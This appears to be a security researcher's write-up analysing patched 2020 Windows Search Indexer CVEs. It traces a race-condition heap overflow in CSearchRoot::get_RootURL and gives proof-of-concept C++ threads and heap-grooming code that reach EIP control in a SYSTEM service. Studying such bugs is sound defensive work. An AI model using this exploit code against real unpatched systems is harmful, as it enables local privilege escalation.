---
title: Analysis of vulnerabilities in MS SearchIndexer
author: SungHyun Park @ Diffense
---

### Windows Search Indexer

The Jan-Feb 2020 security patch fixes multiple bugs in the *Windows Search Indexer*. 

![s-indexer](https://user-images.githubusercontent.com/39076499/77614587-aeecdb80-6f70-11ea-94d7-68123684ab1b.png)

- CVE-2020-0666, CVE-2020-0667, CVE-2020-0735, CVE-2020-0752 (Feb, 2020)
- CVE-2020-0613, CVE-2020-0614, CVE-2020-0623, CVE-2020-0625, CVE-2020-0626, CVE-2020-0627, CVE-2020-0628, CVE-2020-0629, CVE-2020-0630, CVE-2020-0631, CVE-2020-0632, CVE-2020-0633 (Jan, 2020)

It is not common for such many vulnerabilities found one service. It seems that there might be a new attack vector, and we were very curious about what it was. We were hoping that if we finished the analysis we could find another similar 0-day vulnerability. So we began analyzing right away!

Before analyzing, we needed to learn about the Windows Search Indexer. Search Indexer is an app that indexes files for quick search and stores this indexing information as data. From a more detailed perspective, SearchIndexer.exe is a windows service that handles indexing of your files for Windows Search, which fuels the file search engine built into Windows that powers everything from the Start Menu search box to Windows Explorer, and even the Libraries feature.


The below screenshot shows how to adjust the basic options for Search Indexer. The "Modify option" allows users to adjust the indexing range. By default, it indexes the Start Menu and Users Folder under the C: \ drive. Also, through the "Advanced option", we can add the extension or contents of files to be indexed to the index list in more detail.

![s-index2](https://user-images.githubusercontent.com/39076499/77614696-e9ef0f00-6f70-11ea-9c86-344603014c34.png)


At this point, we thought the vulnerability was probably a logical flaw vulnerability due to the creation of a temporary data file and a Local Privilege Escalation (LPE) in the indexing process. The reason is that many windows service-related vulnerabilities take this pattern. As such, we analyzed how the vulnerability could have occurred in this indexing process.


### Patch Analysis

The analysis environment is Windows7 x86. The reason we chose Win7 is that the size of the updated file was very small, making diffing more intuitive. The affected module was searchindexer.exe. We downloaded both patched and unpatched versions of this module.

For win7 x86 those were:

- patched version (January Patch Tuesday) : KB4534314
- patched version (February Patch Tuesday) : KB4537813

They can be downloaded from Microsoft Update Catalog (Reference)

We begin with comparing the December(2019) and January(2020) version of searchindexer.exe in BinDiff :

![3](https://user-images.githubusercontent.com/39076499/77614903-6eda2880-6f71-11ea-9b19-a6e2079ce58c.png)

In the January monthly patch, virtual functions of the CSearchCrawlScopeManager class were patched. We saw diffing on one of the patched functions, the save function. The function read the critical section ID from the class pointer (CSearchCrawlScopeManager) and identified the critical area based on it. Interestingly, all patched CSearchCrawlScopeManger methods have been added to initialize with the same critical section ID (this + 0x48) as shown below. Perhaps a race condition problem occurred between virtual function calls in CSearchCrawlScopeManager.

![11](https://user-images.githubusercontent.com/39076499/77614975-96c98c00-6f71-11ea-8198-cd86fbd7b619.png)

In the February monthly patch, virtual functions of the CSearchRoot class were patched. Seeing that the put_ * and get_ * functions were patched, it seemed that a vulnerability occurred in the process of reading and writing data. Looking at the patch history, similar to the January monthly patch, the put function took the Exclusive Lock and the get function took the Shared Lock.

![a](https://user-images.githubusercontent.com/39076499/77615091-d42e1980-6f71-11ea-8cfe-9e53c018546c.png)
![b](https://user-images.githubusercontent.com/39076499/77615097-d5f7dd00-6f71-11ea-9156-70199300ab65.png)

As a result of analyzing the patched contents, the shared resource exists in the class, and race condition vulnerability is likely to occur in the process of storing and reading indexing information. Now all we have to do is look at what shared resources are stored in the class and how they could lead to vulnerabilities!


### Root Cause Analysis

We referenced the MSDN docs to see how those classes are used and found that they were all related to the Crawl Scope Manager. And we could check the method information of this class.

And the MSDN docs said: 

> The Crawl Scope Manager (CSM) is a set of APIs that lets you add, remove, and enumerate search roots and scope rules for the Windows Search indexer. When you want the indexer to begin crawling a new container, you can use the CSM to set the search root(s) and scope rules for paths within the search root(s). For example, if you install a new protocol handler, you can create a search root and add one or more inclusion rules; then the indexer can start a crawl for the initial indexing. The CSM offers the following interfaces to help you do this programmatically. (Reference)

- [IEnumSearchRoots](https://docs.microsoft.com/en-us/windows/desktop/api/Searchapi/nn-searchapi-ienumsearchroots)
- [IEnumSearchScopeRules](https://msdn.microsoft.com/library/bb266499(VS.85).aspx)
- [ISearchCrawlScopeManager](https://docs.microsoft.com/en-us/windows/desktop/api/Searchapi/nn-searchapi-isearchcrawlscopemanager)
- [ISearchCrawlScopeManager2](https://msdn.microsoft.com/library/dd797832(VS.85).aspx)
- [ISearchRoot](https://docs.microsoft.com/en-us/windows/desktop/api/Searchapi/nn-searchapi-isearchroot)
- [ISearchScopeRule](https://docs.microsoft.com/en-us/windows/desktop/api/Searchapi/nn-searchapi-isearchscoperule)
- [ISearchItem](https://msdn.microsoft.com/library/dd756722(VS.85).aspx)

For examples, adding, removing, and enumerating search roots and scope rules can be written by the following:

The ISearchCrawlScopeManager tells the search engine about containers to crawl and/or watch, and items under those containers to include or exclude. To add a new search root, instantiate an ISearchRoot object, set the root attributes (ISearchRoot::put_RootURL), and then call ISearchCrawlScopeManager::AddRoot and pass it a pointer to ISearchRoot object.

```cpp
// Add RootInfo & Scope Rule
pISearchRoot->put_RootURL(L"file:///C:\ ");
pSearchCrawlScopeManager->AddRoot(pISearchRoot);
pSearchCrawlScopeManager->AddDefaultScopeRule(L"file:///C:\Windows", fInclude, FF_INDEXCOMPLEXURLS);
pSearchCrawlScopeManager->SaveAll(); // Set Registry key
```

We can also use ISearchCrawlScopeManager to remove a root from the crawl scope when we no longer want that URL indexed. Removing a root also deletes all scope rules for that URL. We can uninstall the application, remove all data, and then remove the search root from the crawl scope, and the Crawl Scope Manager will remove the root and all scope rules associated with the root.

```cpp
// Remove RootInfo & Scope Rule
ISearchCrawlScopeManager->RemoveRoot(pszURL);
ISearchCrawlScopeManager->SaveAll(); // Set Registry key
``` 

The CSM enumerates search roots using IEnumSearchRoots. We can use this class to enumerate search roots for a number of purposes. For example, we might want to display the entire crawl scope in a user interface, or discover whether a particular root or the child of a root is already in the crawl scope.

```cpp
// Display RootInfo
PWSTR pszUrl = NULL;
pSearchRoot->get_RootURL(&pszUrl);
wcout << L"\t" << pszUrl;

// Display Scope Rule
IEnumSearchScopeRules *pScopeRules;
pSearchCrawlScopeManager->EnumerateScopeRules(&pScopeRules);

ISearchScopeRule *pSearchScopeRule;
pScopeRules->Next(1, &pSearchScopeRule, NULL))

pSearchScopeRule->get_PatternOrURL(&pszUrl);
wcout << L"\t" << pszUrl;
```

Based on the above, we decided to analyze the following functions in detail.

- Adding Roots to the Crawl Scope → ISearchRoot::put_RootURL, ISearchCrawlScopeManager::AddRoot
- Removing Roots from the Crawl Scope → ISearchCrawlScopeManager::RemoveRoot
- Enumerating Roots in the Crawl Scope  → ISearchRoot::get_RootURL

We conducted binary analysis with IDA Pro to look at the detailed internal behavior. While analyzing ISearchRoot::put_RootURL and ISearchRoot::get_RootURL, we figured out that the object's shared variable (CSearchRoot + 0x14) is actually referenced. The put_RootURL function wrote a user-specified RootURL in the memory of CSearchRoot+0x14. And get_RootURL function read the memory value located in CSearchRoot+0x14. From the point of view of vulnerability patch, it appeared that the problem was caused by this shared variable.

![ff](https://user-images.githubusercontent.com/39076499/77615289-46066300-6f72-11ea-8e25-7fef00284126.png)
![fff](https://user-images.githubusercontent.com/39076499/77615291-4868bd00-6f72-11ea-9dc2-6e6d9f5e3deb.png)

Thus, we finally arrived at the point where the vulnerability actually occurred. The vulnerability was caused by using shared variables in the process of allocation and copying.  CopyOutStr function is called by the get_RootURL function. This function first reads the pszURL(shared variable) in the CSearchRoot class and allocates the heap for that length. Then, StringCchCopyW is called with length equal to pszURL.

![1111](https://user-images.githubusercontent.com/39076499/77615326-633b3180-6f72-11ea-9dcc-9e00a60f3933.png)

Eventually, the vulnerability was in the process of double fetching length, and the vulnerability could be triggered when the following occurs:

1. First fetch: Shared variable used as memory allocation size (line 9)
2. Second fetch: Shared variable used as memory copy size (line 13)

If there is a discrepancy between the size used for the first fetch and the size used for the second fetch, a heap overflow may occur, especially if the size of the second fetch is larger. We thought we could change the size of pszURL(shared value) sufficiently before the memory copy occurs through race condition!


### Triggering POC

Windows Search Indexer is a windows service. Windows service is generally designed to allow COM RPC connection, and clients can exchange data with the server through the interface provided by the service. Through OleView, we were able to see the interface provided by Windows Search Manager. And we need to be able to trigger vulnerable functions based on the methods of that interface.

![Trigger](https://user-images.githubusercontent.com/39076499/77615361-86fe7780-6f72-11ea-8de5-1fb81e2291c3.png)

First of all, we need to construct the core of the COM client to trigger the vulnerable function.  COM client is constructed with the following steps:

**CoInitializeEx** All COM applications start with a call to the CoInitializeEx function, which initializes the COM library. Except for some COM memory allocation functions, we should always call this function before using the service.


**CoCreateInstance** After initializing the COM library using CoInitializeEx, we need to make it possible to instantiate the class through the CoCreateInsance call. If multiple interfaces are supported, each class must register a unique CLSID. So we can call the method of the interface provided by the service.


**CoUninitialize** Finally, CoUninitialize releases any maintained COM resources and closes all RPC connections.


Luckily, we were able to compile and test it through the COM based command line source code provided by MSDN(Reference). And We were able to write COM client code that triggers a vulnerable function like this:

```cpp
    int wmain(int argc, wchar_t *argv[]){
    		// Initialize COM library
        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    		
    		// CoClass Instanciate
    		ISearchRoot *pISearchRoot;
        CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pISearchRoot));
        
    		// Vulnerable function trigger
    		pISearchRoot->put_RootURL(L"Shared RootURL");
        PWSTR pszUrl = NULL;
        HRESULT hr = pSearchRoot->get_RootURL(&pszUrl);
        wcout << L"\t" << pszUrl;
        CoTaskMemFree(pszUrl);
    		
    		// Free COM resource, End
        pISearchRoot->Release();
        CoUninitialize();
    }
```

Since then, triggering the bug is quite simple.

We turned on Gflag.exe's page heap and created two threads : 

The first thread (Thread_01) was programmed to repeatedly write different lengths of the RootURL. The second thread (Thread_02) was programmed to read the written RootURL and return it to the client.


1. Thread_01
```cpp
        DWORD __stdcall test_thread_01(LPVOID param)
        {
        	ISearchManager *pSearchManager = (ISearchManager*)param;
        	wcout << L"First Tread Start!!!." << endl;
        	while (1) {
        		pSearchManager->put_RootURL(L"AA");
        		pSearchManager->put_RootURL(L"AAAAAAAAAA");
        	}
        	return 0;
        }
```

2. Thread_02
```cpp
    DWORD __stdcall test_thread_02(LPVOID param)
    {
    	ISearchRoot *pISearchRoot = (ISearchRoot*)param;
    	PWSTR get_pszUrl;
    	wcout << L"Second Tread Start!!!." << endl;
    	while (1) {
    		pISearchRoot->get_RootURL(&get_pszUrl);
    	}
    	return 0;
    }
```

Okay, now we created a crash!

As expected, a heap overflow occurred while StringCchCopyW function copied RootURL data.

![crash](https://user-images.githubusercontent.com/39076499/77615795-8adec980-6f73-11ea-90f1-aa6db29ec21a.png)


### Exploit (until EIP Control)

Since Windows service basically operates under NT AUTHORITY SYSTEM privilege, it is possible to write executable code with elevated privileges if Window service has a vulnerability.

In this section, we will demonstrate some of the possibilities of code execution. Finally, acquiring a shell requires more COM knowledge. However, we will show that even without knowledge of COM, EIP control is easily possible.

Despite the Win 7 environment, it was very difficult for the client to manage the server heap. We tried diligently to control the heap, and we succeeded in putting controllable objects on the heap. (In fact, this wasn't a Win7 issue, it was a COM issue.)

We programed the code like this:

```cpp
    int wmain(int argc, wchar_t *argv[])
    {
    	CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);
    	ISearchRoot *pISearchRoot[20];
    	for (int i = 0; i < 20; i++) {
    		HRESULT hr = CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pISearchRoot[i]));
    	}
    	pISearchRoot[3]->Release();
    	pISearchRoot[5]->Release();
    	pISearchRoot[7]->Release();
    	pISearchRoot[9]->Release();
    	pISearchRoot[11]->Release();

    	if (1)
    	{
    		wcout << L"Tread Start!!!." << endl;
    		HANDLE t1 = CreateThread(NULL, 0, test_thread_01, (LPVOID)pISearchRoot[13], 0, NULL);
    		HANDLE t2 = CreateThread(NULL, 0, test_thread_02, (LPVOID)pISearchRoot[13], 0, NULL);
    		WaitForSingleObject(t1, 500);
    	}
    	CoUninitialize();
    	return 0;
    }
```

We completed the analysis and found that if the client did not release the pISearchRoot object, an IRpcStubBuffer objects would remain on the server heap. And we also saw that the IRpcStubBuffer object remained near the location of the heap where the vulnerability occurs!

```
    0:010> !heap -p -all
    ...
    03d58f10 0005 0005  [00]   03d58f18    0001a - (busy)     <-- CoTaskMalloc return
    	mssprxy!_idxpi_IID_Lookup <PERF> (mssprxy+0x75)
    03d58f38 0005 0005  [00]   03d58f40    00020 - (free)
    03d58f60 0005 0005  [00]   03d58f68    0001c - (busy)     <-- IRpcStubBuffer Obj
      ? mssprxy!_ISearchRootStubVtbl+10
    03d58f88 0005 0005  [00]   03d58f90    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       <-- IRpcStubBuffer Obj
    03d58fb0 0005 0005  [00]   03d58fb8    00020 - (busy)
    03d58fd8 0005 0005  [00]   03d58fe0    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       <-- IRpcStubBuffer Obj
    03d59000 0005 0005  [00]   03d59008    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       <-- IRpcStubBuffer Obj
    03d59028 0005 0005  [00]   03d59030    00020 - (busy)
    03d59050 0005 0005  [00]   03d59058    00020 - (busy)
    03d59078 0005 0005  [00]   03d59080    00020 - (free)
    03d590a0 0005 0005  [00]   03d590a8    00020 - (free)
    03d590c8 0005 0005  [00]   03d590d0    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       <-- IRpcStubBuffer Obj
```

In COM, all interfaces have their own interface stub space. Stubs are small memory spaces used to support remote method calls during RPC communication, and IRpcStubBuffer is the primary interface for such interface stubs. In this process, the IRpcStubBuffer to support pISearchRoot's interface stub remains on the server's heap.


If pISearchRoot is instantiated, IRpcStubBuffer::Connect provides the interface stub with a actual object pointer associated with the stub object. And when the client's COM Uninitialized, IRpcStubBuffer::Disconnect disconnects all connections of object pointer.

The vtfunction of IRpcStubBuffer is as follows. If the client calls CoUninitialize function after an oob attack, CStdStubBuffer_Disconnect function is called on the server. This means that users can construct fake vtable and call that functions.


```
    0:003> dds poi(03d58f18) l10
    71215bc8  7121707e mssprxy!CStdStubBuffer_QueryInterface
    71215bcc  71217073 mssprxy!CStdStubBuffer_AddRef
    71215bd0  71216840 mssprxy!CStdStubBuffer_Release
    71215bd4  71217926 mssprxy!CStdStubBuffer_Connect
    71215bd8  71216866 mssprxy!CStdStubBuffer_Disconnect <-- Client Call : CoUninitialize();
    71215bdc  7121687c mssprxy!CStdStubBuffer_Invoke
    71215be0  7121791b mssprxy!CStdStubBuffer_IsIIDSupported
    71215be4  71217910 mssprxy!CStdStubBuffer_CountRefs
    71215be8  71217905 mssprxy!CStdStubBuffer_DebugServerQueryInterface
    71215bec  712178fa mssprxy!CStdStubBuffer_DebugServerRelease
```

However, we haven't always seen IRpcStubBuffer allocated on the same location heap. Therefore, several tries were needed to expect the attackable heap. After several attacks, the IRpcStubBuffer object was covered with the controllable value (0x45454545) as follows.

In the end, we can show that indirect calls to any function in memory are possible!

![eip](https://user-images.githubusercontent.com/39076499/77615799-8ca88d00-6f73-11ea-961b-6081eccf634d.png)


### Conclusion

We are excited to have known a "new attack vector" for the Windows Search Indexer. And we think that the memory corruption in Windows Service is also impressive. This is because memory corruption vulnerabilities are not common in Windows Service. Through further analysis of the Search Indexer, vulnerabilities in other functions may be found in addition to the functions that were reported. We look forward to it!

### Reference

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0613](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0613)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0614](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0614)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0623](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0623)

[https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0625](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0625)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0626](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0626)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0627](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0627)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0628](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0628)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0629](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0629)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0630](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0630)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0631](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0631)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0632](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0632)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0633](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0633)

[https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0666](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0666)

[https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0667](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0667)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0735](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0735)

[https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0752](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-0752)

[https://www.catalog.update.microsoft.com/Home.aspx](https://www.catalog.update.microsoft.com/Home.aspx)

[https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm](https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm)

[https://docs.microsoft.com/en-us/windows/win32/search/-search-sample-crawlscopecommandline](https://docs.microsoft.com/en-us/windows/win32/search/-search-sample-crawlscopecommandline)

[https://github.com/tyranid/oleviewdotnet](https://github.com/tyranid/oleviewdotnet)

